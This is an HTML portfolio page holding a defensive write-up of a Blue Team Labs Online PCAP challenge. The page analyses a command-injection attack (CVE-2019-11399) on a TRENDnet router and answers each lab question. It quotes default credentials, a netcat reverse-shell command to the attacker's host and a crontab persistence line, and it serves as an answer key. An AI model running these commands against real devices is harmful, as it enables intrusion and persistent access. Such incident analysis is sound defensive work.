@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="ctf-title" content="Trend">
+    <meta name="ctf-status" content="Retired">
+    <meta name="ctf-pass-hash" content="">
+    <meta name="ctf-platform" content="Blue Team Labs Online">
+    <meta name="ctf-difficulty" content="Easy">
+    <meta name="ctf-category" content="Security Operations">
+    <meta name="ctf-description" content="">
+    <meta name="ctf-tags" content="#Wireshark #LinuxCLITools">
+    <title>Trend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body class="bg-slate-950 text-slate-200 font-sans antialiased selection:bg-cyan-500 selection:text-slate-950">
+    <main class="max-w-4xl mx-auto px-4 py-12 sm:px-6 lg:px-8">
+        <a href="../index.html#writeups" class="inline-flex items-center gap-2 text-slate-400 hover:text-cyan-400 text-sm font-mono mb-8 transition-colors">
+            <i class="fa-solid fa-arrow-left text-xs"></i> Back to Portfolio
+        </a>
+        <article class="prose prose-invert max-w-none space-y-6">
+            <div class="max-w-5xl mx-auto px-4 py-8">
+    <!-- Header Section -->
+    <p class="font-mono text-xs text-slate-500 uppercase tracking-widest mb-2">// BLUE TEAM LABS ONLINE · WRITEUP</p>
+    <h1 class="text-4xl sm:text-5xl font-bold text-slate-100 tracking-tight mb-4">Trend</h1>
+
+    <!-- Metadata Pill Badges -->
+    <div class="flex flex-wrap gap-2 mb-6 font-mono text-xs font-semibold uppercase">
+        <span class="bg-cyan-950/80 text-cyan-400 border border-cyan-800/80 px-3 py-1 rounded">BLUE TEAM LABS ONLINE</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">EASY</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">NETWORK FORENSICS</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">PCAP</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">ROUTER EXPLOIT</span>
+        <span class="bg-slate-900 text-slate-400 border border-slate-800 px-3 py-1 rounded">CVE</span>
+    </div>
+
+    <!-- Action Buttons -->
+    <div class="flex flex-wrap items-center gap-3 my-6 font-mono text-xs">
+        <a href="../index.html#writeups" class="inline-flex items-center gap-2 bg-[#092b38] border border-cyan-800 text-cyan-400 hover:bg-cyan-900/50 px-4 py-2 rounded-lg transition-all">
+            <i class="fa-solid fa-arrow-left text-xs"></i> BACK TO PORTFOLIO
+        </a>
+    </div>
+
+    <!-- Executive Summary & Overview -->
+    <h2 class="text-2xl sm:text-3xl font-bold tracking-tight mb-4 mt-8 text-slate-100 font-sans">Executive Summary</h2>
+    <div class="text-slate-300 text-sm sm:text-base leading-relaxed space-y-4 mb-8 font-sans">
+        <p>This writeup details the investigation of a network security alert originating from a router, based on a provided PCAP file. The analysis focuses on identifying the attacker's methodology, exploited vulnerabilities, and key indicators of compromise (IOCs).</p>
+        <p>The incident involved an attacker exploiting a known vulnerability (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">CVE-2019-11399</code>) in a <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">TRENDnet TEW-652BRU</code> router. Initial access was gained using default credentials (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">admin:admin</code>), followed by command injection through the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">lanHostCfg_HostName_1.1.1.0.0</code> parameter on the <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/get_set.ccp</code> endpoint. The attacker successfully established a reverse shell to their machine (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">192.168.10.2</code>) and implemented a persistence mechanism via <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">crontab</code>.</p>
+        <p>Key findings include the router's IP address (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">192.168.10.1</code>), the exact timestamp of the exploit, and the commands used for initial access, reverse shell establishment, and persistence. This analysis underscores the critical importance of patching, strong credential policies, and continuous network monitoring.</p>
+    </div>
+
+    <!-- Asset Information Table -->
+    <h2 class="text-2xl font-bold text-slate-100 mb-4 font-sans">Asset Information</h2>
+    <div class="overflow-x-auto my-6 rounded-xl border border-slate-800/80 bg-[#0B1120] shadow-xl">
+        <table class="w-full text-left border-collapse text-xs font-mono">
+            <thead>
+                <tr class="border-b border-slate-800 bg-slate-900/60 text-slate-400 uppercase tracking-wider">
+                    <th class="py-3 px-4">HOSTNAME / IP</th>
+                    <th class="py-3 px-4">SUMMARY</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">192.168.10.1</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">Vulnerable TRENDnet TEW-652BRU router, origin of the alert.</td>
+                </tr>
+                <tr class="border-b border-slate-800/50 hover:bg-slate-800/30 transition-colors">
+                    <td class="py-3 px-4 text-cyan-400 font-semibold break-all">192.168.10.2</td>
+                    <td class="py-3 px-4 text-slate-300 break-words font-sans">Attacker's machine, used to exploit the router and receive the reverse shell.</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Question & Answer Solutions -->
+    <h2 class="text-2xl font-bold text-slate-100 mb-6 font-sans">Question & Answer Solutions</h2>
+
+    <!-- Q1 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">1. As the SOC analyst investigating the alert, your first step is to examine the network environment. What is the IP address of the router where the alert originated?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">192.168.10.1</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Cross-referenced IPv6 address from Router Solicitation to ARP packets to identify the router's IPv4 address.</p>
+    </div>
+
+    <!-- Q2 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">2. After identifying the router, we need to document its details for the baseline report and check if it’s not patched. What is the router's model number and version?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">TEW-652BRU_1.00b12</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Identified from HTTP traffic, specifically the User-Agent or server headers, indicating a TRENDnet router model.</p>
+    </div>
+
+    <!-- Q3 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">3. The logs suggest unauthorized access to the router. Can you identify the username and password the attacker used to gain access?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">admin:admin</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Found within HTTP POST requests containing form data for authentication.</p>
+    </div>
+
+    <!-- Q4 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">4. By reviewing the internal network activity, determine the IP address of the machine the attacker used to exploit the router’s firmware.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">192.168.10.2</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Determined based on the source IP of the malicious HTTP requests and the destination IP for the reverse shell connection.</p>
+    </div>
+
+    <!-- Q5 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">5. During the analysis, you pinpoint the vulnerable endpoint used in the attack. What is the full URL of the compromised endpoint?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">http://192.168.10.1/get_set.ccp</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Identified as the target URL for the HTTP POST requests containing the exploit payload.</p>
+    </div>
+
+    <!-- Q6 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">6. While analyzing the attacker’s payloads, which parameter was manipulated to exploit the system?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">lanHostCfg_HostName_1.1.1.0.0</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: A shell command was injected into this specific parameter within the HTTP POST request body.</p>
+    </div>
+
+    <!-- Q7 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">7. Correlating with the CVE database, identify the specific CVE the attacker used in this incident.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">CVE-2019-11399</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: This CVE is associated with command injection vulnerabilities in TRENDnet TEW-652BRU routers, matching the observed exploitation technique.</p>
+    </div>
+
+    <!-- Q8 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">8. In the exploitation phase, the attacker executed their first command on the router firmware. What was this command?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">mkdir test</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Searched for occurrences of "shell.sh" or initial commands in the PCAP's TCP streams, revealing the first executed command after the exploit.</p>
+    </div>
+
+    <!-- Q9 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">9. To build an accurate timeline of events, identify the exact timestamp when the CVE was first exploited.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">2025-01-22 14:37:59</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: This timestamp corresponds to the very first HTTP POST request to the vulnerable endpoint <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">/get_set.ccp</code> containing the malicious payload.</p>
+    </div>
+
+    <!-- Q10 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">10. The attacker made several unsuccessful attempts to establish a reverse shell. Finally, they succeeded. What command did they use to successfully establish the reverse shell?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">~/firmadyne/busybox nc 192.168.10.2 4444 -e /bin/sh</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Identified by analyzing the TCP stream for the successful connection to the attacker's listening port (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">4444</code>) and the command used to initiate it.</p>
+    </div>
+
+    <!-- Q11 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">11. Using the PCAP file, determine the exact timestamp when the attacker successfully established communication with the reverse shell.</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">2025-01-22 14:42:25</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: This timestamp corresponds to the first packet establishing a successful connection on port <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">4444</code> from the router to the attacker's machine.</p>
+    </div>
+
+    <!-- Q12 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">12. After establishing the reverse shell, the attacker issued a command to assess their access level. What was the first command executed?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">whoami</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Observed in the reverse shell's TCP stream as the initial command executed by the attacker to determine their user context.</p>
+    </div>
+
+    <!-- Q13 -->
+    <div class="bg-[#0B1120] border border-slate-800/80 rounded-xl p-6 mb-4 shadow-xl space-y-3">
+        <p class="text-slate-200 text-sm font-sans font-medium">13. The attacker implemented a persistence technique to maintain access. What command did they use to achieve this?</p>
+        <p class="text-cyan-400 font-mono text-base font-bold tracking-wide break-all">echo "@reboot /tmp/shell.sh" >> /etc/crontab</p>
+        <p class="text-slate-400 text-xs font-sans">Reasoning: Found within the reverse shell's TCP stream, showing the attacker adding a cron job to execute a shell script at reboot for persistence.</p>
+    </div>
+
+    <!-- Key Takeaways & Security Insights -->
+    <h2 class="text-2xl font-bold text-slate-100 mb-4 mt-8 font-sans">Key Takeaways & Security Insights</h2>
+    <ul class="space-y-4 text-sm text-slate-300 font-sans my-4">
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">Patch Management:</strong> Unpatched firmware, especially on internet-facing devices like routers, creates critical vulnerabilities. Regular updates are essential to mitigate known CVEs.</div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">Default Credentials:</strong> The use of default usernames and passwords (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">admin:admin</code>) provides an easy entry point for attackers. Strong, unique passwords should be enforced immediately upon device setup.</div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">Network Segmentation & Monitoring:</strong> Monitoring network traffic for unusual patterns, such as outbound connections to unknown ports (<code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">4444</code>) or command injection attempts in HTTP POST requests, is crucial for early detection.</div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">Persistence Mechanisms:</strong> Attackers often establish persistence (e.g., via <code class="font-mono text-cyan-400 bg-cyan-950/40 px-1.5 py-0.5 rounded text-xs">crontab</code>) to maintain access even after reboots. Monitoring system configuration files and scheduled tasks for unauthorized modifications is vital.</div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">PCAP Analysis Skills:</strong> The ability to dissect PCAP files, filter by protocol/port, examine HTTP POST data, and follow TCP streams is fundamental for network forensics and incident response.</div>
+        </li>
+        <li class="flex items-start gap-2">
+            <span class="text-cyan-400 mt-1">•</span>
+            <div><strong class="text-cyan-400 font-semibold font-mono">Threat Intelligence:</strong> Correlating observed attack patterns with CVE databases helps in quickly identifying the specific vulnerability exploited and understanding its implications.</div>
+        </li>
+    </ul>
+</div>
+        </article>
+    </main>
+</body>
+</html>
